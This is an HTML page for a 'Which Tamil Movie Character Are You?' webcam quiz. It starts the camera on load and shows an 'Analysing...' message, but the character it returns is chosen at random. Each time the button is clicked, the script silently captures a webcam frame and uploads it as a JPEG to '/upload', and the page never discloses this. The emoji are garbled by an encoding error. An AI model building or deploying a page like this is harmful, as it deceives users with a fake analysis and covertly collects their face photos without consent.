<!DOCTYPE html>
<html>
<head>
  <title>Character Finder</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      font-family: Arial;
      text-align: center;
      margin: 0;
      background: linear-gradient(135deg, #ff6a00, #ee0979);
      color: white;
      padding: 10px;
    }

    h2 {
      margin-top: 15px;
      font-size: clamp(18px, 4vw, 26px);
      text-shadow: 2px 2px 10px rgba(0,0,0,0.5);
    }

    .container {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 20px;
      flex-wrap: wrap;
    }

    .box {
      width: 100%;
      max-width: 280px;
      aspect-ratio: 1 / 1;
      border-radius: 20px;
      overflow: hidden;
      backdrop-filter: blur(10px);
      background: rgba(255,255,255,0.1);
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
      border: 1px solid rgba(255,255,255,0.2);
    }

    video, img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    button {
      margin-top: 12px;
      padding: 12px 20px;
      font-size: clamp(14px, 3vw, 16px);
      border: none;
      border-radius: 30px;
      cursor: pointer;
      background: linear-gradient(45deg, #00f2fe, #4facfe);
      color: black;
      font-weight: bold;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      transition: 0.2s;
    }

    button:hover {
      transform: scale(1.05);
    }

    #result {
      margin-top: 15px;
      font-size: clamp(16px, 4vw, 20px);
      font-weight: bold;
      color: yellow;
      text-shadow: 0 0 10px black;
      min-height: 24px;
    }

    /* Mobile */
    @media (max-width: 600px) {
      .container {
        flex-direction: column;
        align-items: center;
      }

      button {
        width: 80%;
      }
    }

    /* Desktop */
    @media (min-width: 768px) {
      .container {
        flex-direction: row;
      }
    }
  </style>
</head>

<body>

<h2>ðŸŽ¬ Which Tamil Movie Character Are You? ðŸ”¥</h2>

<!-- Camera Button -->
<button id="cameraBtn" onclick="startCamera()">Enable Camera</button>

<div class="container">

  <!-- Camera -->
  <div class="box">
    <video id="video" autoplay playsinline></video>
  </div>

  <!-- Character -->
  <div class="box">
    <img id="heroImage" src="" />
  </div>

</div>

<button onclick="capture()">ðŸŽ¯ Find Character</button>

<div id="result"></div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const images = [
  {url: "HeroHeroineImages/JV.jpg", name: "Mass Hero ðŸ”¥"},
  {url: "HeroHeroineImages/AK.jpg", name: "Stylish Star ðŸ˜Ž"},
  {url: "HeroHeroineImages/RK.jpg", name: "Superstar ðŸ’¥"},
  {url: "HeroHeroineImages/D.jpg", name: "Versatile Hero â¤ï¸"},
  {url: "HeroHeroineImages/N.jpg", name: "Dazzling Queen"},
  {url: "HeroHeroineImages/TB.jpg", name: "Stylish Diva"},
  {url: "HeroHeroineImages/RV.jpg", name: "Elegant Queen"},
  {url: "HeroHeroineImages/SSK.jpg", name: "Nadippu Arakkan"},
  {url: "HeroHeroineImages/KH.jpg", name: "Aandavar"},
];

let scrollInterval;

// Auto try camera on load
document.addEventListener("DOMContentLoaded", () => {
  startCamera();
});

// Start camera
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    document.getElementById("video").srcObject = stream;

    // Hide button smoothly
    const btn = document.getElementById("cameraBtn");
    btn.style.opacity = "0";
    setTimeout(() => {
      btn.style.display = "none";
    }, 300);

    startScrolling();
  } catch (err) {
    console.log("Camera blocked, user must click button");
  }
}

// Scrolling effect
function startScrolling() {
  const img = document.getElementById("heroImage");

  scrollInterval = setInterval(() => {
    const randomIndex = Math.floor(Math.random() * images.length);
    img.src = images[randomIndex].url;
  }, 120);
}

// Stop scrolling
function stopScrolling() {
  clearInterval(scrollInterval);
}

// Capture + send
function capture() {
  document.getElementById("result").innerText = "Analysing... ðŸ”";

  stopScrolling();

  const randomIndex = Math.floor(Math.random() * images.length);
  const selected = images[randomIndex];

  setTimeout(() => {
    document.getElementById("heroImage").src = selected.url;
    document.getElementById("result").innerText = "You are: " + selected.name;
  }, 500);

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append("image", blob, "photo.jpg");

    fetch("/upload", {
      method: "POST",
      body: formData
    })
    .then(res => res.text())
    .then(data => console.log(data))
    .catch(err => console.error(err));
  }, "image/jpeg");
}
</script>

</body>
</html>
